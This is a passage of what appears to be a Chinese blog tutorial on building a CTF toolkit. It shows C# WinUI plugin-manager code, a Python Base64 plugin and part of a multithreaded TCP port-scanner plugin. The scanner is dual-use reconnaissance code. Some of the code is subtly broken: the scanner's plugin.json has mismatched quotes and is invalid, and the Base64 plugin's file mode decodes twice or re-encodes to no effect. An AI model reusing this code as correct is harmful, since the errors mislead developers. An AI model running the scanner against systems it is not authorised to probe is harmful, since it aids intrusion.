class="keyword">this</span>.InitializeComponent();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 订阅插件加载事件</span></span><br><span class="line">            App.Current.PluginManager.PluginLoaded += PluginManager_PluginLoaded;</span><br><span class="line">            App.Current.PluginManager.PluginLoadFailed += PluginManager_PluginLoadFailed;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 初始化插件列表</span></span><br><span class="line">            InitializePluginList();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitializePluginList</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 清空列表</span></span><br><span class="line">            PluginListView.Items.Clear();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 添加已加载的插件</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> plugin <span class="keyword">in</span> App.Current.PluginManager.LoadedPlugins)</span><br><span class="line">            &#123;</span><br><span class="line">                AddPluginToUI(plugin);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">PluginManager_PluginLoaded</span>(<span class="params"><span class="built_in">string</span> pluginName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> plugin = App.Current.PluginManager.GetPlugin(pluginName);</span><br><span class="line">            <span class="keyword">if</span> (plugin != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>.DispatcherQueue.TryEnqueue(() =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    AddPluginToUI(plugin);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">PluginManager_PluginLoadFailed</span>(<span class="params"><span class="built_in">string</span> pluginName, Exception ex</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.DispatcherQueue.TryEnqueue(() =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> item = <span class="keyword">new</span> ListViewItem</span><br><span class="line">                &#123;</span><br><span class="line">                    Content = <span class="keyword">new</span> StackPanel</span><br><span class="line">                    &#123;</span><br><span class="line">                        Orientation = Orientation.Vertical,</span><br><span class="line">                        Children =</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">new</span> TextBlock &#123; Text = pluginName, FontSize = <span class="number">16</span>, FontWeight = Microsoft.UI.Text.FontWeights.Bold &#125;,</span><br><span class="line">                            <span class="keyword">new</span> TextBlock &#123; Text = <span class="string">$&quot;加载失败: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Foreground = <span class="keyword">new</span> SolidColorBrush(Microsoft.UI.Colors.Red) &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                PluginListView.Items.Add(item);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddPluginToUI</span>(<span class="params">IPlugin plugin</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> item = <span class="keyword">new</span> ListViewItem</span><br><span class="line">            &#123;</span><br><span class="line">                Content = <span class="keyword">new</span> StackPanel</span><br><span class="line">                &#123;</span><br><span class="line">                    Orientation = Orientation.Vertical,</span><br><span class="line">                    Children =</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">new</span> TextBlock &#123; Text = plugin.Name, FontSize = <span class="number">16</span>, FontWeight = Microsoft.UI.Text.FontWeights.Bold &#125;,</span><br><span class="line">                        <span class="keyword">new</span> TextBlock &#123; Text = plugin.Description &#125;,</span><br><span class="line">                        <span class="keyword">new</span> TextBlock &#123; Text = <span class="string">$&quot;版本: <span class="subst">&#123;plugin.Version&#125;</span> | 作者: <span class="subst">&#123;plugin.Author&#125;</span>&quot;</span>, FontSize = <span class="number">12</span>, Foreground = <span class="keyword">new</span> SolidColorBrush(Microsoft.UI.Colors.Gray) &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                Tag = plugin</span><br><span class="line">            &#125;;</span><br><span class="line">            PluginListView.Items.Add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">PluginListView_SelectionChanged</span>(<span class="params"><span class="built_in">object</span> sender, SelectionChangedEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (PluginListView.SelectedItem <span class="keyword">is</span> ListViewItem selectedItem &amp;&amp; selectedItem.Tag <span class="keyword">is</span> IPlugin plugin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 显示插件UI</span></span><br><span class="line">                <span class="keyword">var</span> pluginUI = plugin.GetUI();</span><br><span class="line">                <span class="keyword">if</span> (pluginUI != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    PluginContentPresenter.Content = pluginUI;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    PluginContentPresenter.Content = <span class="keyword">new</span> TextBlock &#123; Text = <span class="string">&quot;该插件没有提供UI界面&quot;</span> &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RefreshPluginsButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            App.Current.PluginManager.LoadAllPlugins();</span><br><span class="line">            InitializePluginList();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五、插件开发"><a href="#五、插件开发" class="headerlink" title="五、插件开发"></a>五、插件开发</h2><h3 id="1-Base64工具插件-Python实现"><a href="#1-Base64工具插件-Python实现" class="headerlink" title="1. Base64工具插件 (Python实现)"></a>1. Base64工具插件 (Python实现)</h3><h4 id="插件目录结构"><a href="#插件目录结构" class="headerlink" title="插件目录结构"></a>插件目录结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Plugins/</span><br><span class="line">└── Base64Tool/</span><br><span class="line">    ├── plugin.json</span><br><span class="line">    └── base64tool.py</span><br></pre></td></tr></table></figure><h4 id="plugin-json-插件清单"><a href="#plugin-json-插件清单" class="headerlink" title="plugin.json (插件清单)"></a>plugin.json (插件清单)</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Base64工具&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Base64编码解码工具，支持文本和文件操作&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFTool Team&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EntryPoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;base64tool.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Python&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="base64tool-py-插件实现"><a href="#base64tool-py-插件实现" class="headerlink" title="base64tool.py (插件实现)"></a>base64tool.py (插件实现)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Plugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Base64工具&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Base64编码解码工具&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.author = <span class="string">&quot;CTFTool Team&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context_json</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行插件功能&quot;&quot;&quot;</span></span><br><span class="line">        context = json.loads(context_json)</span><br><span class="line">        </span><br><span class="line">        action = context.get(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;encode&quot;</span>)</span><br><span class="line">        input_data = context.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        input_type = context.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">&quot;encode&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> input_type == <span class="string">&quot;text&quot;</span>:</span><br><span class="line">                    result = base64.b64encode(input_data.encode()).decode()</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># file</span></span><br><span class="line">                    data = base64.b64decode(input_data)</span><br><span class="line">                    result = base64.b64encode(data).decode()</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># decode</span></span><br><span class="line">                <span class="keyword">if</span> input_type == <span class="string">&quot;text&quot;</span>:</span><br><span class="line">                    result = base64.b64decode(input_data).decode()</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># file</span></span><br><span class="line">                    data = base64.b64decode(input_data)</span><br><span class="line">                    result = base64.b64decode(data).decode()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> json.dumps(&#123;</span><br><span class="line">                <span class="string">&quot;success&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: result</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(&#123;</span><br><span class="line">                <span class="string">&quot;success&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)</span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回UI定义（简化版）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;panel&quot;</span>,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Base64工具&quot;</span>,</span><br><span class="line">            <span class="string">&quot;controls&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;action&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;操作类型&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;options&quot;</span>: [</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;编码&quot;</span>, <span class="string">&quot;selected&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;decode&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;解码&quot;</span>&#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;input_type&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;输入类型&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;options&quot;</span>: [</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;文本&quot;</span>, <span class="string">&quot;selected&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">                        &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;file&quot;</span>, <span class="string">&quot;label&quot;</span>: <span class="string">&quot;文件&quot;</span>&#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;textbox&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;input_data&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;输入数据&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;multiline&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;rows&quot;</span>: <span class="number">5</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;button&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;execute&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;执行&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;textbox&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;output_result&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;label&quot;</span>: <span class="string">&quot;输出结果&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;multiline&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;rows&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="string">&quot;readonly&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="2-端口扫描插件-Python实现"><a href="#2-端口扫描插件-Python实现" class="headerlink" title="2. 端口扫描插件 (Python实现)"></a>2. 端口扫描插件 (Python实现)</h3><h4 id="插件目录结构-1"><a href="#插件目录结构-1" class="headerlink" title="插件目录结构"></a>插件目录结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Plugins/</span><br><span class="line">└── PortScanner/</span><br><span class="line">    ├── plugin.json</span><br><span class="line">    └── portscanner.py</span><br></pre></td></tr></table></figure><h4 id="plugin-json-插件清单-1"><a href="#plugin-json-插件清单-1" class="headerlink" title="plugin.json (插件清单)"></a>plugin.json (插件清单)</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;端口扫描器&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TCP端口扫描工具，支持常见端口快速扫描和全端口扫描&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFTool Team&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EntryPoint&#x27;: &quot;</span>portscanner.py<span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>Type<span class="string">&quot;: &quot;</span>Python<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="portscanner-py-插件实现"><a href="#portscanner-py-插件实现" class="headerlink" title="portscanner.py (插件实现)"></a>portscanner.py (插件实现)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Plugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;端口扫描器&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;TCP端口扫描工具&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.author = <span class="string">&quot;CTFTool Team&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.initialized = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context_json</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行端口扫描&quot;&quot;&quot;</span></span><br><span class="line">        context = json.loads(context_json)</span><br><span class="line">        </span><br><span class="line">        target = context.get(<span class="string">&quot;target&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">        scan_type = context.get(<span class="string">&quot;scan_type&quot;</span>, <span class="string">&quot;common&quot;</span>)  <span class="comment"># common/full</span></span><br><span class="line">        timeout = context.get(<span class="string">&quot;timeout&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        threads = context.get(<span class="string">&quot;threads&quot;</span>, <span class="number">50</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">True</span></span><br><span class="line">        open_ports = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 确定扫描端口范围</span></span><br><span class="line">            <span class="keyword">if</span> scan_type == <span class="string">&quot;common&quot;</span>:</span><br><span class="line">                ports = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">110</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">443</span>, <span class="number">445</span>, <span class="number">3306</span>, <span class="number">3389</span>, <span class="number">5900</span>, <span class="number">8080</span>]</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># full scan (1-1000)</span></span><br><span class="line">                ports = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>)</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># 使用线程池执行扫描</span></span><br><span class="line">            <span class="keyword">with</span> ThreadPoolExecutor(max_workers=threads) <span class="keyword">as</span> executor:</span><br><span class="line">                futures = &#123;executor.submit(<span class="variable language_">self</span>.scan_port, target, port, timeout): port <span class="keyword">for</span> port <span class="keyword">in</span> ports&#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.running:  <span class="comment"># 检查是否需要停止扫描</span></span><br><span class="line">                        executor.shutdown(wait=<span class="literal">False</span>, cancel_futures=<span class="literal">True</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                        </span><br><span class="line">                    port = futures[future]</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        result = future.result()</span><br><span class="line">                        <span class="keyword">if</span> result:</span><br><span class="line">                            service = <span class="variable language_">self</span>.get_service_name(port)</span><br><span class="line">                            open_ports.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;open&quot;</span>, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">return</span> json.dumps(&#123;</span><br><span class="line">                <span class="string">&quot;success&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;target&quot;</span>: target,</span><br><span class="line">                <span class="string">&quot;scan_type&quot;</span>: scan_type,</span><br><span class="line">                <span class="string">&quot;open_ports&quot;</span>: open_ports,</span><br><span class="line">                <span class="string">&quot;total_open&quot;</span>: <span class="built_in">len</span>(open_ports)</span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(&#123;</span><br><span class="line">                <span class="string">&quot;success&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                